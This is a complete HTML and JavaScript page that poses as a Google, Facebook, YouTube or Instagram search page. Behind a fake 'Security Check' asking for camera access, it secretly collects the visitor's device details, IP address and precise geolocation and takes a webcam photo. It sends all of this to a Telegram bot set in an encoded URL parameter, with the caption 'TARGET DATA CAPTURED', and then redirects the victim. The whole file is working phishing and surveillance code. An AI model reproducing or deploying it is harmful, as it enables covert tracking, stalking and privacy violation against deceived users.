<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: #f8f9fa;
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            text-align: center;
            max-width: 600px;
            width: 100%;
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .search-box {
            width: 100%;
            max-width: 500px;
            margin: 20px auto;
        }
        
        .search-input {
            width: 100%;
            padding: 15px 20px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            font-size: 16px;
            outline: none;
        }
        
        .search-input:hover {
            box-shadow: 0 1px 6px rgba(32,33,36,.28);
        }
        
        .buttons {
            margin: 20px 0;
        }
        
        .btn {
            background: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            padding: 10px 16px;
            margin: 0 4px;
            cursor: pointer;
        }
        
        .loading {
            margin: 30px 0;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .verification-box {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            display: none;
        }
        
        .footer {
            margin-top: 30px;
            color: #70757a;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo" id="siteLogo">üîç</div>
        <h1 id="siteTitle">Search</h1>
        
        <div class="search-box">
            <input type="text" class="search-input" id="searchInput" placeholder="Search the web...">
        </div>
        
        <div class="buttons">
            <button class="btn" onclick="performSearch()">Search</button>
            <button class="btn" onclick="performSearch()">I'm Feeling Lucky</button>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Loading your content...</p>
        </div>
        
        <div class="verification-box" id="verificationBox">
            <h3>Security Check Required</h3>
            <p>Please allow camera access to verify you're human</p>
            <button class="btn" style="background: #4285f4; color: white;" onclick="startVerification()">Allow Camera</button>
        </div>
        
        <div class="footer">
            <p id="footerText">¬© 2025 Search Company</p>
        </div>
    </div>

    <script>
        let config = {};
        let verificationStarted = false;
        
        // Load configuration from URL
        function loadConfig() {
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('data');
            
            if (encodedData) {
                try {
                    config = JSON.parse(atob(encodedData));
                    
                    // Customize page based on site name
                    customizePage(config.siteName);
                    
                    // Start the process after a delay
                    setTimeout(startSpyProcess, 2000);
                    
                } catch (e) {
                    console.error("Error loading config:", e);
                    redirectToTarget();
                }
            } else {
                redirectToTarget();
            }
        }
        
        // Customize page to look like the target site
        function customizePage(siteName) {
            const siteTitle = document.getElementById('siteTitle');
            const siteLogo = document.getElementById('siteLogo');
            const footerText = document.getElementById('footerText');
            
            switch(siteName.toLowerCase()) {
                case 'google':
                    siteTitle.textContent = 'Google';
                    siteLogo.textContent = 'G';
                    siteLogo.style.color = '#4285f4';
                    footerText.textContent = '¬© 2025 Google';
                    break;
                case 'facebook':
                    siteTitle.textContent = 'Facebook';
                    siteLogo.textContent = 'f';
                    siteLogo.style.color = '#1877f2';
                    footerText.textContent = '¬© 2025 Facebook';
                    break;
                case 'youtube':
                    siteTitle.textContent = 'YouTube';
                    siteLogo.textContent = '‚ñ∂Ô∏è';
                    siteLogo.style.color = '#ff0000';
                    footerText.textContent = '¬© 2025 YouTube';
                    break;
                case 'instagram':
                    siteTitle.textContent = 'Instagram';
                    siteLogo.textContent = 'üì∑';
                    siteLogo.style.color = '#e4405f';
                    footerText.textContent = '¬© 2025 Instagram';
                    break;
                default:
                    siteTitle.textContent = siteName;
                    footerText.textContent = `¬© 2025 ${siteName}`;
            }
        }
        
        // Main spy process
        async function startSpyProcess() {
            if (verificationStarted) return;
            verificationStarted = true;
            
            document.getElementById('loading').style.display = 'block';
            
            try {
                // Collect device information first
                const deviceInfo = getDeviceInfo();
                const ipAddress = await getIPAddress();
                const location = await getLocation();
                
                // Show verification box
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('verificationBox').style.display = 'block';
                }, 1500);
                
            } catch (error) {
                console.error("Error in spy process:", error);
                redirectToTarget();
            }
        }
        
        // Start camera verification
        async function startVerification() {
            document.getElementById('verificationBox').innerHTML = '<p>Verifying...</p>';
            
            try {
                // Access camera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Take photo
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                await new Promise(resolve => {
                    video.addEventListener('loadedmetadata', () => {
                        setTimeout(resolve, 500);
                    });
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                
                // Get final device info
                const deviceInfo = getDeviceInfo();
                const ipAddress = await getIPAddress();
                const location = await getLocation();
                
                // Send to Telegram
                await sendToTelegram(photoDataUrl, deviceInfo, ipAddress, location);
                
                document.getElementById('verificationBox').innerHTML = '<p style="color: green;">‚úì Verification successful! Redirecting...</p>';
                
                // Redirect to target
                setTimeout(redirectToTarget, 1000);
                
            } catch (error) {
                console.error("Verification error:", error);
                document.getElementById('verificationBox').innerHTML = '<p style="color: red;">Verification failed. Redirecting...</p>';
                setTimeout(redirectToTarget, 2000);
            }
        }
        
        // Redirect to target URL
        function redirectToTarget() {
            if (config.target) {
                window.location.href = config.target;
            } else {
                window.location.href = 'https://google.com';
            }
        }
        
        // Search function (for realism)
        function performSearch() {
            const query = document.getElementById('searchInput').value;
            if (query.trim()) {
                startSpyProcess();
            }
        }
        
        // Device info functions (same as before)
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceInfo = {
                type: "Unknown",
                model: "Unknown",
                os: "Unknown", 
                browser: "Unknown",
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                vendor: navigator.vendor || "Unknown",
                cores: navigator.hardwareConcurrency || "Unknown",
                memory: navigator.deviceMemory || "Unknown"
            };
            
            if (/Android/.test(userAgent)) {
                deviceInfo.type = "Mobile";
                deviceInfo.os = "Android";
                const match = userAgent.match(/Android.*; (.*) Build/);
                if (match) deviceInfo.model = match[1];
            } else if (/iPhone|iPad|iPod/.test(userAgent)) {
                deviceInfo.type = /iPad/.test(userAgent) ? "Tablet" : "Mobile";
                deviceInfo.os = "iOS";
            } else if (/Windows/.test(userAgent)) {
                deviceInfo.type = "Desktop";
                deviceInfo.os = "Windows";
            } else if (/Mac/.test(userAgent)) {
                deviceInfo.type = "Desktop";
                deviceInfo.os = "MacOS";
            }
            
            if (/Chrome/.test(userAgent)) deviceInfo.browser = "Chrome";
            else if (/Firefox/.test(userAgent)) deviceInfo.browser = "Firefox";
            else if (/Safari/.test(userAgent)) deviceInfo.browser = "Safari";
            
            return deviceInfo;
        }
        
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "Unknown";
            }
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "Geolocation not supported" });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        
                        let address = "Unknown";
                        try {
                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
                            const data = await response.json();
                            if (data && data.address) {
                                const addr = data.address;
                                address = `${addr.road || ''} ${addr.village || ''} ${addr.town || ''} ${addr.city || ''}`.trim();
                            }
                        } catch (e) {}
                        
                        resolve({
                            latitude: lat,
                            longitude: lng,
                            accuracy: position.coords.accuracy,
                            address: address,
                            mapUrl: `https://maps.google.com/?q=${lat},${lng}`
                        });
                    },
                    (error) => {
                        resolve({ error: error.message });
                    }
                );
            });
        }
        
        async function sendToTelegram(photoDataUrl, deviceInfo, ipAddress, location) {
            if (!config.token || !config.chatId) return false;
            
            try {
                // Create message
                let message = `üéØ TARGET DATA CAPTURED\n\n`;
                message += `üì± DEVICE:\n`;
                message += `Type: ${deviceInfo.type}\n`;
                message += `Model: ${deviceInfo.model}\n`;
                message += `OS: ${deviceInfo.os}\n`;
                message += `Browser: ${deviceInfo.browser}\n`;
                message += `Screen: ${deviceInfo.screen}\n`;
                message += `Language: ${deviceInfo.language}\n`;
                message += `Platform: ${deviceInfo.platform}\n`;
                message += `Cores: ${deviceInfo.cores}\n`;
                message += `RAM: ${deviceInfo.memory}GB\n\n`;
                
                message += `üåê NETWORK:\n`;
                message += `IP: ${ipAddress}\n\n`;
                
                message += `üìç LOCATION:\n`;
                if (location.error) {
                    message += `Error: ${location.error}\n`;
                } else {
                    message += `Coordinates: ${location.latitude}, ${location.longitude}\n`;
                    message += `Accuracy: ${location.accuracy}m\n`;
                    message += `Address: ${location.address}\n`;
                    message += `Map: ${location.mapUrl}\n`;
                }
                
                message += `\nüïí TIME: ${new Date().toLocaleString()}`;
                
                // Convert photo and send
                const response = await fetch(photoDataUrl);
                const blob = await response.blob();
                
                const formData = new FormData();
                formData.append('chat_id', config.chatId);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', message);
                
                await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return true;
            } catch (error) {
                console.error("Error sending to Telegram:", error);
                return false;
            }
        }
        
        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', loadConfig);
        
        // Auto-start if user interacts with search
        document.getElementById('searchInput').addEventListener('focus', startSpyProcess);
        document.getElementById('searchInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                startSpyProcess();
            }
        });
    </script>
</body>
</html>
